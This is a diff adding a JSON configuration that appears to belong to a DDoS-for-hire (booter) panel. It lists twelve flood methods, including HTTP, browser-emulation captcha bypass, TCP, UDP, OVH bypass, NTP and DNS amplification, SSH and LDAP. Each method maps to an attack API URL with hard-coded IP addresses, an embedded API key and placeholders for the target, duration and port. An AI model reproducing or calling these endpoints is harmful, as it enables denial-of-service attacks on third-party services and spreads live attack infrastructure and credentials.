@@ -1,0 +1,112 @@
+{
+    "Methods": [
+        {
+            "Name": "HTTP-FLOOD",
+            "Description": "Method is useful against regular webservers/low protected targets.",
+            "VIP": false,
+            "Level": "L7",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "HTTP-STORM",
+            "Description": "It sends a very stable stream of HTTP/2 requests per second and it can also bypass some JS challenges.",
+            "VIP": true,
+            "Level": "L7",
+            "URL": [
+                "http://185.229.66.142/api?&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "BROWSER",
+            "Description": "Emulates a real user, which allows you to bypass Captcha or JS challenges.",
+            "VIP": false,
+            "Level": "L7",
+            "URL": [
+                "http://185.229.66.142/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "TCP",
+            "Description": "High PPS flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://185.229.66.142/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "UDP",
+            "Description": "Sending a lot of UDP packets.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "SOCKET",
+            "Description": "SOCKET flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "OVH-TCP",
+            "Description": "TCP flood with OVH bypass.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "NFO",
+            "Description": "TCP flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "NTP",
+            "Description": "High Gbit/s NTP flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "DNS",
+            "Description": "High Gbit/s DNS flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "SSH",
+            "Description": "SSH socket flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "LDAP",
+            "Description": "LDAP flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        }
+    ]
+}
